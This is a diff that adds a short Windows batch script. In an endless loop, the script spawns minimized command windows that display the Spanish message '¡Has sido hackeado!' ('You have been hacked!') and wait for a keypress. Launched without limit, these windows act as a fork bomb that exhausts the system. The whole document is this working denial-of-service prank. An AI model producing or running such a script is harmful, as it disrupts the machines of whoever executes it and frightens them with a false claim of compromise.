@@ -1,0 +1,6 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:loop
+start /min cmd /c "echo ¡Has sido hackeado! & pause >nul"
+goto loop
